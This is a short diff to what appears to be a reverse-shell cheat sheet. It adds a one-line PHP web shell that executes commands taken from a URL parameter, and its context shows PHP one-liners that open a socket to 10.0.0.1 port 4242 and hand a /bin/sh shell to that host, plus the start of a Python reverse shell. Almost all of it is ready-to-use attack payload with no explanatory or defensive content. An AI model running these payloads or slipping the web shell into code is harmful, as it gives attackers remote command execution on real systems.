@@ -176,6 +176,7 @@ python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'
 ### PHP
 
 ```bash
+<?php system($_GET["cmd"]); ?>
 php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
